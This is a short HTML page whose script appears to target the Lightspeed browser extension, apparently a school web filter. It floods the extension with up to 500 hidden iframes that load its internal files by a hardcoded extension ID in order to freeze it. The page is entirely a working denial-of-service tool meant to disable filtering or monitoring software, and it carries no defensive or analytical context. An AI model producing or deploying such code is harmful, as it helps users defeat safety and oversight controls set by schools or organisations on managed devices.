<!DOCTYPE html>
<html>
<head>
  <title>Freeze Lightspeed</title>
</head>
<body style="background:black; color:white; padding:20px;">
  <h1>âš ï¸ Launching Lightspeed Freeze</h1>
  <button onclick="triggerFreeze()">ğŸ”¥ Freeze Now</button>

  <script>
    const extensionId = "ehnniokiiebpinnfegpkdlcamgdcaaje"; // Use latest ID if known
    const files = ["background.js", "popup.html", "manifest.json", "icon-128.png"];

    function triggerFreeze() {
      let count = 0;
      const max = 500;
      const delay = 1;

      const interval = setInterval(() => {
        if (count >= max) return clearInterval(interval);

        const iframe = document.createElement("iframe");
        iframe.style.width = "1px";
        iframe.style.height = "1px";
        iframe.style.position = "absolute";
        iframe.style.left = "-9999px";

        const file = files[Math.floor(Math.random() * files.length)];
        iframe.src = `chrome-extension://${extensionId}/${file}?r=${Math.random()}`;
        document.body.appendChild(iframe);
        setTimeout(() => iframe.remove(), 1500);

        count++;
      }, delay);
    }
  </script>
</body>
</html>
